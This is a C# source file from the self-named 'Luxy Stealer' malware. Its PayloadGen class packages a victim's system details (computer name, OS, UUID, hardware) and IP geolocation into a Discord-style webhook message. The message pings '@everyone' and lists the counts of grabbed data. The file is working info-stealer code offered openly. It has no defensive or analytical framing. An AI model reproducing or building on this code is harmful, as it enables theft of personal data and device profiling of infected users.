﻿using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using LuxyStub.Modules.Stealer.Components.SystemInfo;

namespace LuxyStub.Modules.Stealer.Components.Postman
{
    public struct PayloadFormat
    {
        public string content { get; set; }

        public EmbedStructureFormat[] embeds { get; set; }
    }

    public struct EmbedStructureFormat
    {
        public string title { get; set; }

        public string description { get; set; }

        public string url { get; set; }

        public int color { get; set; }

        public FooterFormat footer { get; set; }

        public ThumbnailFormat thumbnail { get; set; }
    }

    public struct FooterFormat
    {
        public string text { get; set; }
    }

    public struct ThumbnailFormat
    {
        public string url { get; set; }
    }

    internal class PayloadGen
    {
        private readonly Dictionary<string, int> _grabbedDataDict;

        internal PayloadGen(Dictionary<string, int> grabbedDataDict)
        {
            _grabbedDataDict = grabbedDataDict;
        }

        internal async Task<string> GetPayload()
        {
            IpFormat ipinfo = await IpInfo.GetInfo();
            GeneralSystemInfo systemInfo = await General.GetInfo();

            PayloadFormat payload = new PayloadFormat();

            payload.content = "@everyone";

            char cellular = ipinfo.Mobile ? Convert.ToChar(9989) : Convert.ToChar(10062);
            char proxy = ipinfo.Proxy ? Convert.ToChar(9989) : Convert.ToChar(10062);
            string reverseProxy = proxy == Convert.ToChar(9989) ? $"\nReverse DNS: {ipinfo.Reverse}" : string.Empty;
            string grabbedInfo = string.Empty;
            foreach (var item in _grabbedDataDict) grabbedInfo += $"\n{item.Key} : {item.Value}";

            payload.embeds = new[]
            {
                new EmbedStructureFormat
                {
                    title = "Luxy Stealer",
                    description = $@"
**__System Info__**
```autohotkey
Computer Name: {systemInfo.ComputerName}
Computer OS: {systemInfo.ComputerOs}
Total Memory: {systemInfo.TotalMemory}
UUID: {systemInfo.Uuid}
CPU: {systemInfo.Cpu}
GPU: {systemInfo.Gpu}
```

**__IP Info__**
```prolog
IP: {ipinfo.Query}
Region: {ipinfo.RegionName}
Country: {ipinfo.Country}
City: {ipinfo.City}
Org: {ipinfo.Org}
Timezone: {ipinfo.Timezone}

Cellular Data: {cellular}
Proxy/VPN:     {proxy}
{reverseProxy}
```

**__Grabbed Data__**
```js{grabbedInfo}
```
".Trim(),
                    url = "https://github.com/Ayuly3851/Luxy",
                    color = 34303,
                    footer = new FooterFormat
                    {
                        text = $"Luxy Stealer {LuxyStub.Settings.Version} | https://github.com/Ayuly3851/Luxy"
                    },
                    thumbnail = new ThumbnailFormat
                    {
                        url = "https://github.com/Ayuly3851/Luxy"
                    }
                }
            };

            return SimpleJson.SerializeObject(payload);
        }
    }
}